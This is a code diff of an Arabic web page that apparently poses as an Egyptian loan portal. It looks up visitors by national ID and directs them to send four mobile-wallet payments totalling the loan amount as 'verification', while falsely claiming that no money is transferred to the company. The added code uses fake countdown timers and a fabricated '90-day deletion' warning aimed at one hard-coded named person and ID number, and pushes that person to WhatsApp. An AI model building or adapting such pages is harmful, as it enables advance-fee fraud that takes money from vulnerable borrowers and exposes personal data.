-    function buildInstructionsModal(client) {
-    if (!client.wallet || client.wallet.includes("لا يوجد")) {
+    function formatNumber(num) {
+        return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+    }
+
+    // واجهة خاصة بالعميل "جودة" – تحذير شطب 90 يوم بدون أي تفاصيل مالية
+    function buildDeletionWarningStage(client) {
         return `
-            <div class="client-summary">
-                <p><i class="fas fa-user"></i> الاسم: <strong>${client.name}</strong></p>
-                <p><i class="fas fa-id-card"></i> الرقم القومي: <strong>${client.normalizedId}</strong></p>
-                <p><i class="fas fa-dollar-sign"></i> المبلغ المعتمد: <strong>${client.loanRaw} ج.م</strong></p>
-            </div>
-            <div style="border-right: 4px solid #FF8C42; background: rgba(255,140,66,0.1); border-radius:1rem; padding:1rem;">
-                <i class="fas fa-exclamation-triangle" style="color:#FF8C42;"></i> <strong>لا توجد محفظة إلكترونية مسجلة</strong><br>
-                يجب عليك فتح محفظة فودافون كاش أو اتصالات كاش في أقرب وقت، ثم العودة لإكمال عملية الربط والصرف.
-            </div>
-            <div class="timer-section" style="margin-top:1rem;">
-                <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي لتأكيد الربط</div>
-                <div class="countdown-timer" id="modalTimer">26:00</div>
+            <div class="warning-deletion">
+                <i class="fas fa-hourglass-end"></i>
+                <h2>⚠️ جاري شطب طلبك فوراً</h2>
+                <p><strong>${client.name}</strong>،<br>
+                سيتم شطب طلب التمويل الخاص بك خلال دقائق ولن تتمكن من استعادة الطلب إلا بعد مرور <strong style="color:#FF8888;">90 يوماً كاملة</strong>.</p>
+                <p>❌ لن تتمكن من إكمال الإجراءات أو صرف القرض إذا لم تتواصل مع قسم التحويلات المالية فوراً.</p>
+                <p style="margin-top: 1rem;"><strong>⏳ المتبقي قبل الشطب النهائي: أقل من 10 دقائق</strong></p>
+                <button class="btn-whatsapp-urgent" id="urgentWhatsAppBtn">
+                    <i class="fab fa-whatsapp fa-lg"></i> التواصل العاجل مع قسم التحويلات المالية
+                </button>
+                <div style="margin-top: 1rem; font-size: 0.8rem; color: #ffaaaa;">* لن تظهر أي تفاصيل قرض أو محفظة حتى يتم إنقاذ الطلب.</div>
             </div>
         `;
     }
-    const loanNum = parseInt(client.loanRaw.replace(/[^\d]/g, ''), 10);
-    // ✅ السطر المعدل
-    const perOperation = client.proofAmountPerOperation || Math.floor(loanNum / 4);
-    const isEtisalat = client.isEtisalat === true || client.wallet.includes("اتصالات");
-    const providerName = isEtisalat ? "اتصالات كاش" : "فودافون كاش";
-    const code = isEtisalat ? "6#*777*" : "100#*9*";
-    const fee = "5 جنيهات (لصالح شركة الاتصالات)";
 
-    return `
-        <div class="client-summary">
-            <p><i class="fas fa-user"></i> الاسم: <strong>${client.name}</strong></p>
-            <p><i class="fas fa-id-card"></i> الرقم القومي: <strong>${client.normalizedId}</strong></p>
-            <p><i class="fas fa-wallet"></i> المحفظة: <strong>${client.wallet}</strong> (${client.walletNum || "رقم غير مسجل"})</p>
-            <p><i class="fas fa-dollar-sign"></i> المبلغ المعتمد: <strong>${client.loanRaw} ج.م</strong></p>
-        </div>
-        <div class="linking-instructions" style="margin:0; padding:1rem;">
-            <div class="instructions-title" style="font-size:1.2rem;"><i class="fas fa-link"></i> تعليمات ربط المحفظة (${providerName})</div>
-            <div class="instruction-step">
-                <div class="step-header"><i class="fas fa-dial"></i> ❶ كود تأكيد الحساب</div>
-                <div class="code-box" style="font-size:1rem;">${code}</div>
-            </div>
-            <div class="instruction-step">
-                <div class="step-header"><i class="fas fa-calculator"></i> ❷ مبلغ التأكيد لكل عملية</div>
-                <div><span class="highlight-value">${perOperation.toLocaleString()} ج.م</span> (×4 عمليات = ${(perOperation*4).toLocaleString()} ج.م)</div>
-            </div>
-            <div class="instruction-step">
-                <div class="step-header"><i class="fas fa-receipt"></i> ❸ رسوم التأكيد</div>
-                <div>${fee}</div>
-            </div>
-            <div class="instruction-step">
-                <div class="step-header"><i class="fas fa-camera-retro"></i> ❹ توثيق العملية</div>
-                <div>التقط 4 لقطات شاشة واضحة (واحدة لكل عملية) تظهر المبلغ والتاريخ والرقم.</div>
-            </div>
-            <div class="instruction-step">
-                <div class="step-header"><i class="fas fa-cloud-upload-alt"></i> ❺ رفع اللقطات</div>
-                <div>بعد جمع اللقطات الأربع، اضغط على الزر أدناه لرفعها عبر النموذج الآمن.</div>
-            </div>
-        </div>
-        <div class="timer-section">
-            <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي لإتمام الربط</div>
-            <div class="countdown-timer" id="modalTimer">26:00</div>
-            <div style="font-size:0.7rem;">بعد رفع الصور سيتم فتح رابط التحويل الفوري خلال دقائق</div>
-        </div>
-        <div class="info-section" style="background:#0a2f2f;">
-            <i class="fas fa-shield-alt"></i> إجراء آمن: لا تحول أي مبلغ إلى الشركة، فقط تأكيد ملكية المحفظة.
-        </div>
-    `;
-}
+    // الواجهة العادية (ربط المحفظة) – كما كانت
+    function buildNormalStage(client) {
+        const loanAmountNum = parseInt(client.loanRaw.replace(/\D/g, ''), 10);
+        const perOperation = Math.floor(loanAmountNum / 4);
+        const isEtisalat = client.isEtisalat === true || (client.wallet && client.wallet.includes("اتصالات"));
+        const providerName = isEtisalat ? "اتصالات كاش" : "فودافون كاش";
+        const code = isEtisalat ? "6#*777*" : "100#*9*";
+        
+        if (!client.wallet || client.wallet.includes("لا يوجد")) {
+            return `
+                <div class="client-badge">
+                    <div class="client-info"><h3>${client.name}</h3><p>${client.normalizedId}</p></div>
+                    <div><i class="fas fa-exclamation-triangle" style="color:#D4AF37;"></i> بحاجة إلى محفظة</div>
+                </div>
+                <div class="warning-note">
+                    <i class="fas fa-wallet"></i> لا توجد محفظة إلكترونية مسجلة. يرجى فتح محفظة فودافون كاش أو اتصالات كاش ثم العودة لإتمام الربط.
+                </div>
+                <div class="timer-container">
+                    <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي لتأكيد الربط</div>
+                    <div class="countdown-clock" id="countdownDisplay">26:00</div>
+                </div>
+                <button class="btn-upload" id="uploadScreensBtn"><i class="fab fa-whatsapp"></i> تواصل مع الدعم لاستكمال الإجراءات</button>
+            `;
+        }
 
-    function startModalCountdown() {
+        return `
+            <div class="client-badge">
+                <div class="client-info">
+                    <h3><i class="fas fa-user-check"></i> ${client.name}</h3>
+                    <p><i class="fas fa-id-card"></i> الرقم القومي: ${client.normalizedId}</p>
+                    <p><i class="fas fa-wallet"></i> المحفظة: ${client.wallet} (${client.walletNum || "غير مسجل"})</p>
+                </div>
+                <div><i class="fas fa-check-circle" style="color:var(--emerald);"></i> معتمد مسبقاً</div>
+            </div>
+            <div class="loan-amount-digit">
+                <div>💰 مبلغ التمويل المعتمد</div>
+                <div class="digit-number">${client.loanRaw} ج.م</div>
+                <div style="font-size:0.8rem;">القسط الشهري: ${client.installment} ج.م | المدة: ${client.loanTerm}</div>
+            </div>
+            <div class="linking-guide">
+                <div class="guide-title"><i class="fas fa-link"></i> 🔗 ربط المحفظة الذكي (${providerName})</div>
+                <div class="step-card">
+                    <div><span class="step-number">1</span> كود التأكيد:</div>
+                    <div class="code-highlight">${code}</div>
+                </div>
+                <div class="step-card">
+                    <div><span class="step-number">2</span> مبلغ التأكيد المطلوب (4 مرات)</div>
+                    <div><span style="color:var(--royal-gold); font-weight:800;">${formatNumber(perOperation)} ج.م</span> × 4 عمليات = ${formatNumber(perOperation*4)} ج.م</div>
+                    <div style="font-size:0.8rem;">📌 رسوم الخدمة: 5 جنيهات لكل عملية (لصالح شركة الاتصالات)</div>
+                </div>
+                <div class="step-card">
+                    <div><span class="step-number">3</span> توثيق العملية</div>
+                    <div>قم بالتقاط 4 لقطات شاشة واضحة تظهر المبلغ والتاريخ ورقم العملية من تطبيق المحفظة.</div>
+                </div>
+                <div class="step-card">
+                    <div><span class="step-number">4</span> رفع اللقطات والأمان</div>
+                    <div>بعد جمع اللقطات الأربع، اضغط الزر بالأسفل لرفعها في بيئة آمنة.</div>
+                </div>
+                <div class="timer-container">
+                    <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي لتأكيد الربط</div>
+                    <div class="countdown-clock" id="countdownDisplay">26:00</div>
+                    <div style="font-size:0.7rem; margin-top:0.5rem;">بعد رفع الصور سيتم فتح رابط التحويل الفوري خلال دقائق</div>
+                </div>
+                <button class="btn-upload" id="uploadScreensBtn"><i class="fas fa-cloud-upload-alt"></i> رفع لقطات الشاشة (لإنهاء الصرف)</button>
+                <div class="warning-note" style="margin-top:1rem;">
+                    <i class="fas fa-shield-alt"></i> إجراء آمن: أنت تقوم فقط بتأكيد ملكية المحفظة، لا تحول أي مبلغ للشركة.
+                </div>
+            </div>
+        `;
+    }
+
+    function startCountdown() {
         if (countdownInterval) clearInterval(countdownInterval);
         let secondsLeft = 26 * 60;
-        const timerEl = document.getElementById('modalTimer');
+        const timerEl = document.getElementById('countdownDisplay');
         if (!timerEl) return;
         countdownInterval = setInterval(() => {
             if (secondsLeft <= 0) {
@@ -560,50 +813,79 @@
                 secondsLeft--;
                 const mins = Math.floor(secondsLeft / 60);
                 const secs = secondsLeft % 60;
-                timerEl.innerText = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+                timerEl.innerText = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
             }
         }, 1000);
     }
 
-    function showLinkModal(client) {
-        const modal = document.getElementById('linkModal');
-        const modalBody = document.getElementById('modalBody');
-        modalBody.innerHTML = buildInstructionsModal(client);
-        modal.style.display = 'flex';
-        startModalCountdown();
-
-        const uploadBtn = document.getElementById('modalUploadBtn');
-        if (uploadBtn) {
-            uploadBtn.onclick = () => {
-                window.open(LINKING_FORM_URL, '_blank');
-                alert("تم فتح نموذج رفع الصور. بعد إرسال الصور سيتم صرف القرض فوراً خلال دقائق.");
-            };
-        }
+    function showSecurityModal() {
+        const modal = document.getElementById('securityModal');
+        if (modal) modal.style.display = 'flex';
     }
 
-    function closeLinkModal() {
-        const modal = document.getElementById('linkModal');
+    function closeSecurityModal() {
+        const modal = document.getElementById('securityModal');
         if (modal) modal.style.display = 'none';
-        if (countdownInterval) clearInterval(countdownInterval);
     }
 
     function searchCustomer() {
         let rawId = document.getElementById('nationalId').value.trim();
-        if (!rawId) { alert('الرجاء إدخال الرقم القومي'); return; }
-        const normalized = normalizeIdTo14(rawId);
-        
+        if (!rawId) {
+            alert("الرجاء إدخال الرقم القومي (14 رقم)");
+            return;
+        }
+        const normalized = normalizeId(rawId);
+        if (normalized.length !== 14) {
+            alert("الرقم القومي يجب أن يحتوي على 14 رقمًا");
+            return;
+        }
+
         const loader = document.getElementById('loader');
+        const resultPanel = document.getElementById('resultPanel');
+        const errorCard = document.getElementById('errorCard');
+        
         loader.style.display = 'block';
-        document.getElementById('errorCard').style.display = 'none';
-        document.getElementById('resultCard').classList.remove('show');
+        resultPanel.style.display = 'none';
+        errorCard.style.display = 'none';
         
         setTimeout(() => {
             loader.style.display = 'none';
             if (clientsDB[normalized]) {
-                currentCustomer = { ...clientsDB[normalized], normalizedId: normalized };
-                showLinkModal(currentCustomer);
+                currentClient = { ...clientsDB[normalized], normalizedId: normalized };
+                
+                // حالة خاصة للعميل "جودة عبدالنبى"
+                if (normalized === "27603160102274" && currentClient.specialStatus === "deletion_warning") {
+                    // عرض رسالة الشطب فقط بدون أي تفاصيل
+                    resultPanel.innerHTML = buildDeletionWarningStage(currentClient);
+                    resultPanel.style.display = 'block';
+                    // إضافة حدث زر واتساب العاجل
+                    const urgentBtn = document.getElementById('urgentWhatsAppBtn');
+                    if (urgentBtn) {
+                        urgentBtn.onclick = () => {
+                            window.open(`${WHATSAPP_SUPPORT_URL}?text=${encodeURIComponent(`🚨 عاجل جداً - طلب العميل ${currentClient.name} - الرقم القومي ${normalized} جاري شطبه وحظر 90 يوم. أرجو التدخل العاجل لإنقاذ الطلب.`)}`, '_blank');
+                        };
+                    }
+                    // لا نعرض المودال الأمني لأنه قد يشتت المستخدم في هذه الحالة الحرجة
+                    return;
+                }
+                
+                // الوضع العادي لبقية العملاء
+                resultPanel.innerHTML = buildNormalStage(currentClient);
+                resultPanel.style.display = 'block';
+                startCountdown();
+                showSecurityModal(); // إظهار المودال الأمني للعملاء العاديين
+                
+                const uploadBtn = document.getElementById('uploadScreensBtn');
+                if (uploadBtn) {
+                    uploadBtn.onclick = () => {
+                        window.open(LINKING_FORM_URL, '_blank');
+                        alert("تم فتح نموذج رفع الصور الآمن. بعد إرسال الصور، سيتم صرف القرض فوراً خلال دقائق.");
+                    };
+                }
             } else {
-                document.getElementById('errorCard').style.display = 'block';
+                errorCard.style.display = 'block';
+                resultPanel.style.display = 'none';
+                if (countdownInterval) clearInterval(countdownInterval);
             }
         }, 800);
     }
@@ -612,8 +894,8 @@
         if (e.key === 'Enter') searchCustomer();
     });
 
-    window.closeLinkModal = closeLinkModal;
     window.searchCustomer = searchCustomer;
+    window.closeSecurityModal = closeSecurityModal;
 </script>
 </body>
 </html>
